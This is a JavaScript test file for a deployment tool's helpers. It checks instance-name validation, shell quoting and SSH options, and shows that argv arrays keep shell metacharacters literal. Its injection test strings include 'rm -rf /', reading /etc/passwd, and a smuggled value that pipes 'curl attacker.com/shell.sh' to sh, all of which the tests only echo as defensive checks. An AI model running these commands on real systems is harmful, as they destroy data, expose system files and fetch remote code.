// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { spawnSync } = require("child_process");

const {
  validateInstanceName,
  shellQuote,
  SSH_OPTS,
} = require("../bin/lib/deploy");

const { runCaptureArgv } = require("../bin/lib/runner");

describe("deploy helpers", () => {
  describe("validateInstanceName", () => {
    it("accepts valid names", () => {
      for (const name of ["my-box", "prod.server", "test_01", "a", "A1-b.c_d"]) {
        assert.doesNotThrow(() => validateInstanceName(name));
      }
    });

    it("rejects names starting with hyphen", () => {
      assert.throws(() => validateInstanceName("-bad"), /Invalid instance name/);
    });

    it("rejects shell injection", () => {
      assert.throws(() => validateInstanceName("foo;rm -rf /"), /Invalid instance name/);
    });

    it("rejects command substitution", () => {
      assert.throws(() => validateInstanceName("$(whoami)"), /Invalid instance name/);
    });

    it("rejects empty string", () => {
      assert.throws(() => validateInstanceName(""), /Invalid instance name/);
    });

    it("rejects names with spaces", () => {
      assert.throws(() => validateInstanceName("foo bar"), /Invalid instance name/);
    });

    it("rejects backtick command substitution", () => {
      assert.throws(() => validateInstanceName("`whoami`"), /Invalid instance name/);
    });

    it("rejects pipe", () => {
      assert.throws(() => validateInstanceName("foo|bar"), /Invalid instance name/);
    });

    it("rejects names starting with dot", () => {
      assert.throws(() => validateInstanceName(".hidden"), /Invalid instance name/);
    });
  });

  describe("shellQuote", () => {
    it("wraps in single quotes", () => {
      assert.equal(shellQuote("hello"), "'hello'");
    });

    it("escapes embedded single quotes", () => {
      assert.equal(shellQuote("it's"), "'it'\\''s'");
    });
  });

  describe("SSH_OPTS", () => {
    it("uses StrictHostKeyChecking=accept-new (TOFU)", () => {
      assert.ok(SSH_OPTS.includes("StrictHostKeyChecking=accept-new"));
    });

    it("does not contain StrictHostKeyChecking=no", () => {
      assert.ok(!SSH_OPTS.some((o) => o.includes("StrictHostKeyChecking=no")));
    });
  });

  // ── Injection PoC ──────────────────────────────────────────────
  // Prove that argv arrays (spawnSync without shell) treat shell
  // metacharacters as literal text. These are the 5 injection methods
  // that bash -c would execute but argv arrays do not.

  describe("argv injection proof-of-concept", () => {
    it("$() subshell is literal, not expanded", () => {
      const r = spawnSync("echo", ["$(echo PWNED)"], { encoding: "utf-8", stdio: "pipe" });
      assert.ok(r.stdout.includes("$(echo PWNED)"), "subshell must be literal");
      assert.ok(!r.stdout.includes("PWNED\n"), "subshell must not expand");
    });

    it("backtick substitution is literal, not executed", () => {
      const r = spawnSync("echo", ["`echo HACKED`"], { encoding: "utf-8", stdio: "pipe" });
      assert.ok(r.stdout.includes("`echo HACKED`"), "backtick must be literal");
    });

    it("semicolon chaining is literal, not split", () => {
      const r = spawnSync("echo", ["hello; echo INJECTED"], { encoding: "utf-8", stdio: "pipe" });
      assert.ok(r.stdout.includes("hello; echo INJECTED"), "semicolon must be literal");
    });

    it("pipe is literal, not interpreted", () => {
      const r = spawnSync("echo", ["data | cat /etc/passwd"], { encoding: "utf-8", stdio: "pipe" });
      assert.ok(r.stdout.includes("data | cat /etc/passwd"), "pipe must be literal");
    });

    it("&& chaining is literal, not executed", () => {
      const r = spawnSync("echo", ["ok && echo PWNED"], { encoding: "utf-8", stdio: "pipe" });
      assert.ok(r.stdout.includes("ok && echo PWNED"), "&& must be literal");
    });
  });

  describe("runCaptureArgv", () => {
    it("captures stdout without shell interpretation", () => {
      const out = runCaptureArgv("echo", ["hello", "world"]);
      assert.equal(out, "hello world");
    });

    it("returns empty string on failure with ignoreError", () => {
      const out = runCaptureArgv("false", [], { ignoreError: true });
      assert.equal(out, "");
    });

    it("passes $() literally through argv", () => {
      const out = runCaptureArgv("echo", ["$(whoami)"]);
      assert.equal(out, "$(whoami)");
    });
  });

  describe("runSsh", () => {
    // We can't call runSsh directly (it calls runArgv which exits on failure),
    // but we can verify the SSH_OPTS constants and the argv construction pattern

    it("SSH_OPTS contains accept-new and LogLevel=ERROR", () => {
      assert.deepEqual(SSH_OPTS, [
        "-o", "StrictHostKeyChecking=accept-new",
        "-o", "LogLevel=ERROR",
      ]);
    });

    it("SSH_OPTS does not contain StrictHostKeyChecking=no", () => {
      const joined = SSH_OPTS.join(" ");
      assert.ok(!joined.includes("StrictHostKeyChecking=no"));
    });
  });

  describe("runArgv security properties", () => {
    it("argv arrays pass sandbox names with hyphens literally", () => {
      const r = spawnSync("echo", ["my-assistant"], { encoding: "utf-8", stdio: "pipe" });
      assert.equal(r.stdout.trim(), "my-assistant");
    });

    it("argv arrays pass GPU specs with colons literally", () => {
      const r = spawnSync("echo", ["a2-highgpu-1g:nvidia-tesla-a100:1"], { encoding: "utf-8", stdio: "pipe" });
      assert.equal(r.stdout.trim(), "a2-highgpu-1g:nvidia-tesla-a100:1");
    });

    it("argv prevents NEMOCLAW_GPU injection via brev create", () => {
      // Simulate what would happen if NEMOCLAW_GPU contained injection
      const maliciousGpu = 'a100"; curl attacker.com/shell.sh|sh; echo "';
      const r = spawnSync("echo", ["--gpu", maliciousGpu], { encoding: "utf-8", stdio: "pipe" });
      // With argv, the entire string is one argument — no shell interpretation.
      // "attacker" appears in stdout as literal text (not executed).
      // The key assertion: the entire payload is passed through verbatim as
      // a single argv element, proving no shell splitting or interpretation.
      assert.ok(r.stdout.includes(maliciousGpu));
      assert.equal(r.stdout.trim(), `--gpu ${maliciousGpu}`);
    });

    it("argv passes file paths with spaces literally", () => {
      const r = spawnSync("echo", ["/path/with spaces/file.txt"], { encoding: "utf-8", stdio: "pipe" });
      assert.equal(r.stdout.trim(), "/path/with spaces/file.txt");
    });

    it("argv passes environment variable syntax literally", () => {
      const r = spawnSync("echo", ["NVIDIA_API_KEY=${SECRET}"], { encoding: "utf-8", stdio: "pipe" });
      assert.equal(r.stdout.trim(), "NVIDIA_API_KEY=${SECRET}");
    });
  });
});
